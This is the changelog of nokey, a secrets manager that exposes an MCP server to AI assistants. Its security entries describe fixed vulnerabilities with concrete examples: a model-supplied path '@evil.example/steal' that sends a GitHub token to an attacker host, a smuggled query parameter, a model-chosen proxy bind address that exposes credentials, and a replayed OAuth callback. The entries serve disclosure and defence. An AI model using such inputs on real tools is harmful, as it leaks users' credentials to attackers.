# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

## [0.5.3] - 2026-08-31

Security release. Every item below closes a hole that was reachable in
v0.5.0; there are no new features and no configuration changes are
required to pick them up.

The v0.5.1 and v0.5.2 tags carry the same content but published nothing.
Both release runs died before any artifact was built — v0.5.1 on
Homebrew's new refusal to load formulae from an untrusted tap, v0.5.2 on
a GoReleaser version that required a newer Go than the runner had. No
artifacts were ever attached to either tag, and tags here are immutable,
so the fixed pipeline ships under v0.5.3. Nothing to do if you saw
either tag — there was never anything to install. The release path is
now exercisable as a dry run, so the next failure of this kind costs a
workflow run rather than a version number.

### Security
- PIN brute-force backoff is now actually enforced. The exponential
  backoff (3 failures, then 1s doubling to a 60s cap) has existed and
  been unit-tested since it was written, but nothing ever supplied it
  with a store: `defaultBackoffStore()` returned nil and every call site
  in `Authenticate` was guarded by `if bs := backoffStoreFn(); bs != nil`,
  so in shipped binaries the check, the failure counter, and the reset
  were all no-ops. Wrong PINs could be tried back-to-back at full speed.
  `internal/keyring` now registers each opened `Store` via the new
  `auth.SetBackoffStore`, so any process that can reach a PIN hash also
  persists failures — under `__nokey_auth_failures__`, which is hidden
  from `nokey list` and from backups like the other internal keys.
  Counters survive across CLI invocations, so re-running nokey no longer
  resets the limiter.
- The proxy now refuses to listen anywhere but loopback. `Server.Start`
  took its address verbatim, so `nokey proxy start --addr 0.0.0.0:9999`
  — or, worse, an MCP `start_proxy {"addr": "0.0.0.0:9999"}` call, where
  the address comes straight from the model — published a listener that
  injects your secrets into any request matching a proxy rule. Anyone
  who could reach the port could spend your credentials without ever
  seeing them. Rejected now: the unspecified address in all its spellings
  (`:9999`, `0.0.0.0`, `[::]`), routable literals, IPv4-mapped IPv6 forms
  such as `[::ffff:0.0.0.0]`, and hostnames other than `localhost`. The
  bound address is re-checked after `net.Listen` so a `localhost` that
  resolves somewhere unexpected is caught too. Both entry points validate
  before opening the keyring, so a refused address no longer costs a
  keychain unlock or pulls proxy secrets into memory first.
- Integration requests can no longer be retargeted at another host.
  `apiclient.Do` built its URL as `baseURL + path`, and `github_api`
  takes that path straight from the model, so a path of
  `@evil.example/steal` produced
  `https://api.github.com@evil.example/steal` — which parses as host
  `evil.example` with `api.github.com` demoted to userinfo. The request
  went to the attacker carrying the injected
  `Authorization: Bearer <GITHUB_TOKEN>`, handing over the very
  credential the integration exists to keep out of the model's reach.
  Paths are now parsed as a relative reference and resolved against the
  base URL, and the result is rejected unless its scheme and host still
  match the integration's own.
- GitHub tool parameters are URL-escaped instead of concatenated.
  `buildQuery` built `key=value` pairs by hand, so a `state` of
  `open&per_page=100` smuggled in a second parameter; it now goes
  through `url.Values`. Path parameters are escaped per segment, so an
  `owner`, `repo`, or file path containing `/`, `?`, or `#` stays one
  segment instead of reaching a different endpoint. `github_get_file`
  additionally refuses `.` and `..` segments, which address an API
  endpoint rather than a file in the repository.
- The OAuth callback endpoint now answers exactly one request. It kept
  listening after the authorization code arrived, and the caller only
  shut it down once the token exchange, validation, and two keyring
  writes had finished — a window that includes a Touch ID prompt. The
  endpoint is on loopback, reachable by any local process including the
  AI assistant, and the CSRF state is printed to the terminal as part of
  the authorization URL, so a second callback carrying an attacker's
  authorization code was accepted and queued. nokey would have exchanged
  and stored it, leaving the user authenticated as someone else. Later
  callbacks now get 410 Gone, and the port closes as soon as the first
  response is written.
- Callback channel sends no longer block. `codeChan` and `errChan` hold
  one value each, so repeated callbacks stranded a request goroutine per
  send until the 10s write timeout.
- Response bodies read from remote peers are bounded. `io.ReadAll` on an
  integration response or an OAuth provider's reply read whatever the
  peer chose to send. Integration responses cap at 10 MiB and report an
  error rather than returning a truncated body a caller would mistake
  for the whole response; OAuth error bodies truncate at 1 MiB, and the
  user-info decode — unbounded because a streaming `json.Decoder` reads
  as far as the value goes — now runs over a limited reader.
- `--redact` now catches secrets that straddle a read boundary.
  Redaction ran independently on each chunk read from the PTY, so a
  secret delivered in two pieces — the tail of one read and the head of
  the next — matched neither half and reached the terminal in the clear.
  Any child that writes a secret in separate `write` calls, or writes
  one large enough to be split, hit this. A regression test splitting a
  24-character secret at every offset leaked it at 27 of 37 positions
  before the fix.
  The reader now carries a holdback between reads. Rather than always
  withholding a fixed-size tail, it withholds only a tail that could
  actually open a secret or one of its encoded variants, so ordinary
  output — notably an interactive prompt with no trailing newline — is
  still passed through immediately instead of waiting for the next
  write. The holdback is flushed when the stream ends.
- The redacting reader's buffers are zeroed when the stream is done. The
  holdback is by construction a fragment of a secret.
- Pin the Go toolchain to go1.26.7. `govulncheck` reported nine standard
  library vulnerabilities on paths this code calls — post-handshake
  message handling in `crypto/tls` reached from the proxy, the
  `html/template` Javascript-context fix reached from the OAuth callback
  page, quadratic `resolvePath` in `net/url` reached from every
  integration request, and six more — all fixed in go1.26.4 or go1.26.6.
  The toolchain was pinned to go1.26.3, so v0.5.0 binaries carried them.
  Reachable vulnerabilities: nine before, zero after.
- Bump `golang.org/x/crypto` to v0.52.0, clearing thirteen advisories.
  None were reachable: they live in `ssh` and `acme`, while nokey uses
  `argon2` and `nacl/secretbox`.

### Changed
- `nokey proxy start --addr` and the MCP `start_proxy` tool now reject
  non-loopback addresses. If you were binding the proxy to `0.0.0.0` or
  a LAN address, that no longer works — deliberately, since it exposed
  your credentials to anyone who could reach the port. Bind to loopback
  and reach it from another host through an SSH tunnel instead.

### Fixed
- CI runs again. Every run since June failed at startup because the org
  permits only GitHub-owned and Marketplace-verified actions and
  `golangci/golangci-lint-action` is neither; a startup failure takes
  down the whole run, so build, test and vet stopped executing too and
  v0.5.0 was released without CI ever having run against it. The linter
  and GoReleaser are now installed directly and pinned. `release.yml`
  had the same exposure through `goreleaser-action`, where a tag would
  have failed at startup and published nothing.
- CI additionally runs the suite on macOS, where the keychain code lives
  and had never been compiled in CI, under `-race`, and with
  `govulncheck`.

## [0.5.0] - 2026-05-25

### Added
- Opt-in dedicated-keychain mode on macOS. Setting `keyring.dedicated: true`
  in `config.yaml` stores secrets in `~/Library/Keychains/nokey.keychain-db`
  instead of the login keychain, which lets Touch ID actually gate the
  keychain. The login-keychain ignored `UseBiometrics` because
  byteness/keyring only wires Touch ID for named keychain files. Combined
  with ad-hoc-signed local builds (whose code-signing identity changes on
  every `make build`, invalidating the per-item ACL), users were getting
  a macOS password prompt on every launch. With a dedicated keychain,
  Touch ID unlocks the keychain once per nokey process.
- `nokey keychain backup --out FILE [--password-stdin]` — write an
  Argon2id + NaCl-secretbox encrypted snapshot of every user secret.
  PIN-gated when a PIN is configured. Internal `__nokey_` entries are
  skipped so a backup is never a vector for swapping the PIN hash. The
  passphrase is prompted on the terminal; pass `--password-stdin` to
  pipe it from another process. The passphrase is never accepted as a
  CLI argument because argv leaks to the process table on macOS.
- `nokey keychain restore --in FILE [--password-stdin] [--dry-run]` —
  restore secrets from a snapshot. Skips secrets that already exist with
  the same value; aborts atomically (writes nothing) if any secret
  exists with a different value, so an in-place value is never silently
  clobbered.
- `nokey keychain to-dedicated [--no-backup] [--yes]` — migrate from the
  login keychain into the dedicated keychain. PIN-gated; writes a
  mandatory encrypted backup under
  `~/.config/nokey/backups/v0.5.0-pre-migration-<timestamp>.enc` first;
  refuses atomically on any destination value conflict and prints the
  exact `security delete-generic-password ...` commands to resolve it;
  roundtrip-verifies every written value before stamping the
  `__nokey_migrated_to_dedicated__` sentinel, so a crash mid-migration
  is safe to retry.
- `nokey keychain from-dedicated [--yes]` — roll the migration back into
  the login keychain. Refuses to run without the sentinel so it cannot
  quietly do nothing on a never-migrated install. Same atomic-conflict
  semantics as `to-dedicated`; on success cleans up the orphan
  `nokey/com.nokey.biometrics` Touch ID stash and prints the
  `security delete-keychain` invocation if you want to remove the
  dedicated file too.
- `nokey keychain prune-orphan [--dry-run]` — detect and remove the
  Touch ID passphrase stash that byteness/keyring writes under
  `nokey/com.nokey.biometrics` in the login keychain when the dedicated
  keychain file has been deleted out from under nokey.
- `keyring.dedicated` (bool, default false) and `keyring.name` (string,
  default `"nokey"`) config keys controlling the new mode.
- First-time `to-dedicated` prints a nokey-flavored heads-up before the
  upstream byteness/keyring "aws-vault" passphrase prompt fires. The
  upstream string is hardcoded in the library; the banner clarifies
  that the misnamed prompt is in fact the nokey dedicated-keychain
  passphrase. Banner fires only when the dedicated keychain file does
  not yet exist (one-time setup).

### Fixed
- `checkKeychainMigrationHint` no longer suggests the legacy
  `nokey keychain migrate` command when `keyring.dedicated: true` is
  enabled or when the `__nokey_migrated_to_dedicated__` sentinel is
  present. Users on the new dedicated-keychain mode shouldn't see a
  hint for a command that doesn't apply to them.
- Test runs no longer hang for the macOS Security framework timeout
  when the per-binary ACL cache has expired. `rootCmd.PersistentPreRun`
  calls `checkKeychainMigrationHint`, which reaches the real login
  keychain via cgo `SecItemCopyMatching` through `getKeyring()`. Tests
  that drove `rootCmd.Execute()` without a `withTestKeyring` seam
  (`TestCompletionBash` and friends) hung waiting on a UI dialog that
  has no surface inside `go test`. `TestMain` now installs a no-op
  `getKeyring` stub; tests that need a real keyring still override it
  via `withTestKeyring`. The latent hang had shipped since v0.2.0 — it
  was invisible whenever the ACL was already cached (which is most of
  the time during a full suite run) and reproduced deterministically
  after roughly 5 minutes of idle.

### Changed
- Nothing breaking for default users. The dedicated keychain is opt-in;
  on existing installs nokey continues to use the macOS login keychain
  unchanged. v0.5.0 is safe to upgrade with no action required.

### Upgrade guide

Default users have nothing to do — the new keychain mode is opt-in for
v0.5.0. If your local nokey build prompts for a Keychain password every
launch (typically after `make build` produces a new ad-hoc-signed
binary), opt in once:

```bash
# 1. enable the dedicated keychain in ~/.config/nokey/config.yaml
keyring:
  dedicated: true

# 2. migrate (writes an encrypted pre-migration backup first)
nokey keychain to-dedicated
```

Subsequent nokey runs unlock the dedicated keychain with Touch ID once
per process. Login-keychain entries are left in place; a future
`keychain prune-login` step (v0.6.0+) will clean them up after a
deprecation window. Roll back any time with
`nokey keychain from-dedicated`.

The dedicated keychain is a separate file from "login" in Keychain
Access, does not sync via iCloud Keychain, and does not auto-unlock at
OS login — Touch ID handles that on first nokey use.

The default-on rollout is planned for v0.6.0 (with a deprecation
warning) and removal of the login-keychain code path on macOS for
v0.7.0.

## [0.4.2] - 2026-05-21

### Security
- Proxy CONNECT now validates the TLS SNI and inner request `Host`
  header against the CONNECT-line host. Previously a client could
  CONNECT to an allow-listed host (binding that host's rules and
  injected headers to the tunnel) and then send inner requests for
  any other host — the proxy would still inject the allow-listed
  host's secrets because rule matching keyed off the outer host. SNI
  mismatch terminates the tunnel; inner `Host` mismatch returns 421
  Misdirected Request and skips the upstream call. Literal-IP
  CONNECT hosts are exempt from the SNI check (RFC 6066).
- Pin Go toolchain to 1.26.3, closing 9 stdlib vulnerabilities
  reachable from nokey under 1.26.1: GO-2026-4865/4866/4946/4947
  (crypto/x509), GO-2026-4870 (crypto/tls KeyUpdate DoS), GO-2026-4918
  (net/http HTTP/2 loop), GO-2026-4971 (net Dial NUL panic on Windows),
  GO-2026-4865/4980/4982 (html/template XSS in the OAuth callback page).
- MCP `HandleExec` now consults the policy before reading any secret
  values. Previously it called `store.GetAll()` first, so a request
  policy ultimately denied still unlocked the keyring and pulled every
  secret into memory. New ordering: list names → filter by `only`/
  `except` → policy check → token/approval → fetch surviving values.
- OAuth callback state comparison now uses `subtle.ConstantTimeCompare`
  instead of string `!=`, removing a faint timing oracle on the CSRF
  token. Practical exposure was small (32 random bytes) but a secrets
  manager should not offer any.

### Fixed
- `nokey set --stdin` now preserves multi-line values. Previously
  `bufio.Scanner` returned only the first line, so piping a PEM
  block, JSON service-account, or any newline-containing secret
  silently stored just the first line.
- Concurrent `audit.Record` calls (e.g. parallel MCP tool calls) no
  longer break the hash chain. The load-head / append / save-head
  sequence is now serialized; two concurrent callers could previously
  both append with the same `prev_hmac` and one chain-head write
  would clobber the other, producing permanent "chain break"
  warnings on subsequent loads.
- Audit chain verifier now warns when the log file has more entries
  than the chain head records. Truncation was already flagged; the
  append case relied on the encrypted-payload check incidentally
  failing on the crafted bytes, which isn't a guaranteed signal.
- Audit encryption-key cache holds its mutex across the load. The
  previous double-checked-lock dropped the lock between the nil check
  and the load, so two concurrent first callers could both write to
  the keyring — causing an extra user-visible keychain prompt on
  fresh installs.
- Proxy `Stop()` now drains in-flight CONNECT goroutines before
  clearing the secrets map. Hijacked TLS conns are not tracked by
  `http.Server.Shutdown`, so in-flight ResolveHeaders calls could
  read a nil map and silently drop injected headers from concurrent
  requests.
- Proxy CONNECT now skips the upstream RoundTrip when
  `ResolveHeaders` fails. The 502 was already returned to the
  client, but execution still fell through to the upstream call
  without the intended header.
- Redact `Run()` now waits for its three spawned goroutines (SIGWINCH
  handler, signal forwarder, stdin→PTY copy) before returning. They
  previously outlived the call, racing with any caller that swapped
  `os.Stdin` after `Run` returned (race detector flagged this in
  `TestRun_NoSecrets` / `TestRun_BasicExecution`).
- `keyring.Store.cache` map is now guarded by a mutex. Safe today
  because MCP creates a fresh `Store` per request, but any future
  caller that retains a `Store` across goroutines would race.

### Changed
- `nokey exec` now enforces `policies.yaml` rules. Previously the policy
  file was honoured only by the MCP server and the proxy, so a user who
  wrote rules expecting them to apply at the CLI was silently bypassed.
  When no `policies.yaml` exists the behaviour is unchanged (allow-all).
  To restore the old CLI-bypass behaviour, set
  `auth.cli_enforce_policy: false` in `config.yaml`.
- File backend: store keyring entries in `~/.config/nokey/keyring/` instead
  of the parent config dir. The library treated every file in `FileDir`
  as a keyring entry, so once `nokey init` (or audit/session) wrote
  `config.yaml`/`policies.yaml`/`audit.log`/`session_ticket` alongside
  secrets, `nokey list` would show those as fake "secrets" and `nokey
  exec`/`mcp` failed with `illegal base64 data`. Existing file-backend
  installs are migrated automatically on first run; aux files stay put.
- Integration HTTP client now has a 30s default timeout. The caller's
  context deadline still applies; this is defence in depth against a
  caller that forgets to set one.
- Proxy now uses a per-instance forward transport (`Server.SetTransport`)
  instead of mutating `http.DefaultTransport`. Production behaviour
  unchanged — `forwardTransport()` falls back to `http.DefaultTransport`
  when unset — but tests that previously swapped the global no longer
  race with in-flight CONNECT goroutines.

## [0.2.0] - 2026-03-24

### Added
- Homebrew cask tap (`nokey-ai/homebrew-tap`) with GoReleaser auto-publish
- `make check` convenience target (test + vet + lint)
- Test coverage for `keychain migrate` command (6 tests)
- `nokey init` command to generate starter config and policies files
- `nokey completion` command for bash, zsh, fish, and powershell
- `nokey list --json` and `nokey status --json` for machine-readable output
- `nokey version --long` showing commit, build date, Go version, and platform
- Cross-platform config directory: `%APPDATA%\nokey` on Windows
- Example `policies.yaml` with Anthropic, OpenAI, and GitHub rules
- GitHub Actions release workflow triggered by `v*` tags
- CHANGELOG.md

### Changed
- Bump Go 1.24 → 1.26 (post-quantum TLS defaults, Green Tea GC)
- Bump GitHub Actions to Node.js 24 (checkout v6, setup-go v6, golangci-lint-action v9, goreleaser-action v7)
- Migrate golangci-lint config to v2 format
- Release workflow uses GitHub App token instead of PAT for tap publishing
- README documents `init`, `completion`, `--json`, and `version --long`
- `config validate` detects unknown YAML keys (typos)
- Error messages now include actionable hints (e.g., "run `nokey status`")
- Standardized error wrapping across all commands (lowercase, `%w`)
- Config directory resolution extracted to `config.ConfigDir()` for reuse

### Fixed
- Skip `MigrateAllItems` tests on non-macOS (function is darwin-only no-op)
- Fix lint: ineffectual assignment, error strings ending with newlines, unchecked Close()
- Redact `ClientSecret` fields from config.yaml on save
- Bare `return err` in MCP server startup now wrapped with context

### Security
- Bump `buger/jsonparser` v1.1.1 → v1.1.2 (DoS vulnerability, Dependabot #3)
- Bump Go 1.24.0 → 1.24.13 (8 stdlib CVEs in crypto/tls, net/url, crypto/x509)
- `.gitignore` now excludes `policies.yaml`, `*.key`, `*.crt`, `*.pem`

## [0.1.0] - 2025-01-01

### Added
- Core secret management: `set`, `get`, `list`, `delete`, `import`, `export`
- OS-native keyring storage (macOS Keychain, Windows Credential Manager, Linux keyrings)
- PIN-based zero-trust authentication with Argon2id hashing
- Sudo-style session caching to reduce PIN re-entry
- OAuth 2.0 authentication (GitHub and custom OIDC providers)
- `nokey exec` — run subprocesses with secrets injected as environment variables
- Output redaction replacing secret values with `[REDACTED:KEY_NAME]`
- Encoding-aware redaction (base64, URL-encoded, hex)
- Scoped policies to gate secret access by command pattern
- Approval gateway prompting users before secret injection
- Session-scoped access lease tokens to reduce approval fatigue
- HTTP/HTTPS intercept proxy injecting secrets into API headers
- `--isolate` egress filtering blocking network access without proxy rules
- MCP (Model Context Protocol) server for AI assistant integration
- Service-aware MCP integration framework with GitHub tools
- Auto-minting of MCP session tokens on first approved call
- macOS Keychain trust and migration commands
- Audit logging with JSON/CSV export and retention policies
- `nokey status` and `nokey config validate` commands
- Best-effort memory zeroing for secret values
- golangci-lint CI, comprehensive test suite (88%+ coverage)
- goreleaser config for cross-platform releases (darwin/linux/windows × amd64/arm64)
